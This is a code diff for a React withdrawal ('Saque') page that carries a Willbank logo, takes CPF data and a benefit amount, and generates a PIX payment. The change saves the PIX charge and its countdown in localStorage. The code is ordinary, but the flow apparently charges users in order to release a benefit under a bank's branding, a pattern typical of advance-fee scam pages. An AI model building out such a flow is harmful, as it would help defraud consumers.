@@ -15,6 +15,7 @@ import { toast } from "@/hooks/use-toast";
 import willbankLogo from "@/assets/willbank-logo.png";
 import { supabase } from "@/integrations/supabase/client";
 import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
+import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
 
 interface PixData {
   code: string;
@@ -35,6 +36,8 @@ const Saque = () => {
   const [showPix, setShowPix] = useState(false);
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
+  const pixStorageKey = getPixStorageKey("saque");
+
   // Try to get data from location state or session
   const session = getSession();
   const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
@@ -47,7 +50,7 @@ const Saque = () => {
     window.scrollTo(0, 0);
   }, []);
 
-  // Generate PIX on mount
+  // Generate PIX on mount or restore from storage
   useEffect(() => {
     if (!cpfData || !valorBeneficio) {
       navigate("/");
@@ -56,6 +59,21 @@ const Saque = () => {
 
     // Save session
     saveSession({ cpfData, currentStep: "/saque", valorBeneficio, protocolo });
+
+    // Check for existing valid PIX
+    const storedPix = getStoredPixData(pixStorageKey);
+    if (storedPix) {
+      setPixData({
+        code: storedPix.code,
+        qrcode_base64: storedPix.qrcode_base64,
+        transaction_id: storedPix.transaction_id,
+        external_id: storedPix.external_id,
+      });
+      setCountdown(getPixRemainingTime(pixStorageKey));
+      setIsLoadingPix(false);
+      startPaymentCheck(storedPix.external_id);
+      return;
+    }
 
     const generatePix = async () => {
       try {
@@ -104,12 +122,16 @@ const Saque = () => {
 
         const data = response.data;
         if (data?.data?.pix) {
-          setPixData({
+          const newPixData = {
             code: data.data.pix.code,
             qrcode_base64: data.data.pix.qrcode_base64,
             transaction_id: data.data.id,
             external_id: externalId,
-          });
+          };
+          setPixData(newPixData);
+          
+          // Save to localStorage for persistence
+          savePixData(pixStorageKey, newPixData);
 
           // Start polling for payment status
           startPaymentCheck(externalId);
